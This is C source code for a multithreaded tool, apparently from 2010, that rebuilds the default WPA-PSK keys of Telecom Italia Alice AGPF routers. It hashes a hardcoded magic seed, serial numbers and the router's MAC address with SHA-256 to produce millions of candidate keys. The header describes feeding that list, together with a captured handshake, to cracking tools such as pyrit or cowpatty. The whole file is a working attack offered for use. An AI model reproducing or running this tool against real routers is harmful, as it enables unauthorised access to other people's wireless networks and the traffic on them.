/*
 * alice_agpf_brute.c
 * 2010/10/02 v4.2
 *
 * Telecom Italia Alice AGPF WPA-PSK TMTO
 *             coded by mon@iwS
 *
 * usage: ./alice_agpf_brute [-q(uick)] [-t(Nthreads)] [-o outfile] [-p psk] <mac>
 *    eg: ./alice_agpf_brute -f -o test.lst 00:23:8E:15:A0:2D
 *        ./alice_agpf_brute -q -t4 -p 4xfod0gr5tzgy8s5bu5b93fd 00:25:53:2e:97:b9
 *
 * using a custom, stripped down version of sha2 library, this tool will
 * generate 8 millions PSKs for a given MAC address in a matter of seconds
 * (less than 7s on fast CPUs). you can put that list to a good use later,
 * with the help from tools like pyrit, cowpatty or ews on win32 and
 * a network handshake.
 *
 * "quick" mode computes up to 599.999 serials per serie, if not specified it'll
 * generate 999.999 psks for every serie
 *
 * can also test a psk against a list of serials
 *
 * supporting multithreading up to 16
 *
 * 03/10: code cleanup
 * 02/10: we now support multithreading ;)
 * 01/10: code revamp and features added
 * 26/09: bugfixes
 * 20/09: large speedup due to fast ints + new series + general recode
 */

#include <stdio.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>
#include <pthread.h>

#include "sha256.h"

struct thread_data {
    uint_fast8_t  *m;
    FILE          *fp;
    unsigned char *psk2;
    uint_fast32_t  start;
    uint_fast32_t  end;
};

pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;

uint_fast8_t s[14];

inline uint_fast8_t *
sn (uint_fast8_t a, uint_fast32_t b, uint_fast8_t a2 )
{
    uint_fast8_t *x = a2 == 0 ? "6790" : "6910";
    uint_fast8_t c = 0;
    memcpy(s,x,4);
    s[4] = a ; s[5] = 'X' ; s[6] = '0';
    for(c = 7; c < 13; c++) {
        s[13-(c-7)-1] = '0' + b % 10;
        b -= b % 10;
        b /= 10;
    }
    s[13] = 0;
    return s;
}

void
pskBrute (uint_fast8_t *mac, unsigned char *path,
          unsigned char *psk2, uint8_t quick)
{
    uint_fast8_t magic[32] = {
        0x64, 0xC6, 0xDD, 0xE3, 0xE5,
        0x79, 0xB6, 0xD9, 0x86, 0x96,
        0x8D, 0x34, 0x45, 0xD2, 0x3B,
        0x15, 0xCA, 0xAF, 0x12, 0x84,
        0x02, 0xAC, 0x56, 0x00, 0x05,
        0xCE, 0x20, 0x75, 0x91, 0x3F,
        0xDC, 0xE8
    };

    uint_fast32_t U = 0, Ul = quick == 1 ? 599999 : 999999;
     uint_fast8_t table[36] = "0123456789abcdefghijklmnopqrstuvwxyz";
     uint_fast8_t hash[32], psk[25]; psk[24] = 0;
     uint_fast8_t b, a2, K, n = 0xA;

    SHA256_CTX shaX;
    SHA256_Init(&shaX);
    SHA256_Update(&shaX,magic,32);
    SHA256_CTX sha;

    if(psk2 == NULL) {
        FILE *dict = fopen(path,"w+");
        for(U = 0; U < Ul; U++) {
          for(b = '1'; b <= '4'; b++) {
            for(a2 = 0; a2 <= 1; a2++) {
              memcpy(&sha,&shaX,sizeof(shaX));
              SHA256_Update(&sha,sn(b,U,a2),13);
              SHA256_Update(&sha,mac,6);
              SHA256_Final(hash,&sha);
              for(K = 0; K < 24; K++) psk[K] = table[hash[K]%36];
              fwrite(psk,24,1,dict); fputc(n,dict);
            }
          }
        }
        fclose(dict);
        printf("done.\n");
    } else {
        for(U = 0; U < Ul; U++) {
          for(b = '1'; b <= '4'; b++) {
            for(a2 = 0; a2 <= 1; a2++) {
              memcpy(&sha,&shaX,sizeof(shaX));
              SHA256_Update(&sha,sn(b,U,a2),13);
              SHA256_Update(&sha,mac,6);
              SHA256_Final(hash,&sha);
              for(K = 0; K < 24; K++) psk[K] = table[hash[K]%36];
              if(strncmp(psk2, psk, 24) == 0) {
                printf("found: %s %s %02x:%02x:%02x:%02x:%02x:%02x\n",
                        sn(b,U,a2), psk,
                        mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
                return;
              }
            }
          }
        }
        printf("nothing found for %s. exiting.\n", psk2);
    }

    return;
}

void
pskBrute_mt (void *threadarg)
{
    struct thread_data *my_data;
    my_data = (struct thread_data *)threadarg;
        unsigned char *psk2  = my_data->psk2;
        uint_fast32_t  start = my_data->start;
        uint_fast32_t  end   = my_data->end;
         uint_fast8_t *mac   = my_data->m;
                 FILE *dict  = my_data->fp;

    uint_fast8_t magic[32] = {
        0x64, 0xC6, 0xDD, 0xE3, 0xE5,
        0x79, 0xB6, 0xD9, 0x86, 0x96,
        0x8D, 0x34, 0x45, 0xD2, 0x3B,
        0x15, 0xCA, 0xAF, 0x12, 0x84,
        0x02, 0xAC, 0x56, 0x00, 0x05,
        0xCE, 0x20, 0x75, 0x91, 0x3F,
        0xDC, 0xE8
    };

    uint_fast32_t U = start, Ul = end;
     uint_fast8_t table[36] = "0123456789abcdefghijklmnopqrstuvwxyz";
     uint_fast8_t  hash[32], psk[25]; psk[24] = 0;
     uint_fast8_t b, a2, K, n = 0xA;

    SHA256_CTX shaX;
    SHA256_Init(&shaX);
    SHA256_Update(&shaX,magic,32);
    SHA256_CTX sha;

    if(psk2 == NULL) {
        for(U = start; U < Ul; U++) {
          for(b = '1'; b <= '4'; b++) {
            for(a2 = 0; a2 <= 1; a2++) {
              memcpy(&sha,&shaX,sizeof(shaX));
              SHA256_Update(&sha,sn(b,U,a2),13);
              SHA256_Update(&sha,mac,6);
              SHA256_Final(hash,&sha);
              for(K = 0; K < 24; K++) psk[K] = table[hash[K]%36];
              pthread_mutex_lock(&mutex);
              fwrite(psk,24,1,dict); fputc(n,dict);
              pthread_mutex_unlock(&mutex);
            }
          }
        }
        fflush(dict);
        printf("thread %06u - %06u done.\n", start, end); fflush(stdout);
    } else {
        for(U = start; U < Ul; U++) {
          for(b = '1'; b <= '4'; b++) {
            for(a2 = 0; a2 <= 1; a2++) {
              memcpy(&sha,&shaX,sizeof(shaX));
              SHA256_Update(&sha,sn(b,U,a2),13);
              SHA256_Update(&sha,mac,6);
              SHA256_Final(hash,&sha);
              for(K = 0; K < 24; K++) psk[K] = table[hash[K]%36];
              if(strncmp(psk2, psk, 24) == 0) {
                printf("found: %s %s %02x:%02x:%02x:%02x:%02x:%02x\n",
                        sn(b,U,a2), psk,
                        mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
                return;
              }
            }
          }
        }
    }
}

int
main (int argc, char *argv[])
{
    unsigned char *path = NULL, *psk = NULL;
     uint_fast8_t  mac[6];
          uint8_t  quick = 0, threads = 0, t = 0;
             char  c;

    if(argc < 4) {
        fprintf(stderr, "usage: %s [-q] [-t N] [-p psk] [-o outfile] <mac>\n", argv[0]);
        return -1;
    }

    while((c = getopt(argc, argv, ":qo:p:t:")) != -1)
        switch(c) {
            case 'q': quick = 1; break;
            case 'o': path = optarg; break;
            case 'p': psk = optarg; break;
            case 't': threads = (atoi(optarg)) > 16 ? 16 : (atoi(optarg)); break;
            case ':': break;
            case '?': break;
             default: return -1;
        }

    for(; optind < argc; optind++) {
        if(access(argv[optind], R_OK)) {
            if(sscanf(argv[optind], "%02x:%02x:%02x:%02x:%02x:%02x",
                    &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5])) {
                if(threads <= 1) {
                    pskBrute(mac, path, psk, quick);
                } else {
                    uint_fast32_t slice = quick == 1 ? (600000 / threads) : (1000000 / threads);
                    struct thread_data mt_args[threads];
                    FILE *dict = fopen(path,"a+");
                    void *status;

                    pthread_t thread[threads];
                    pthread_attr_t attr;
                    pthread_attr_init(&attr);
                    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE);

                    for(t = 0; t < threads; t++) {
                        mt_args[t].m = mac;
                        mt_args[t].fp = dict;
                        mt_args[t].psk2 = psk;
                        mt_args[t].start = ((slice * (t+1)) - slice);
                        mt_args[t].end = mt_args[t].start + slice;
                        pthread_create(&thread[t], NULL, pskBrute_mt, (void *)&mt_args[t]);
                    };

                    pthread_attr_destroy(&attr);

                    for(t = 0; t < threads; t++) {
                        pthread_join(thread[t], &status);
                    }

                    fclose(dict);

                    printf("all done.\n");
                }
            }
        }
    }
    return 0;
}

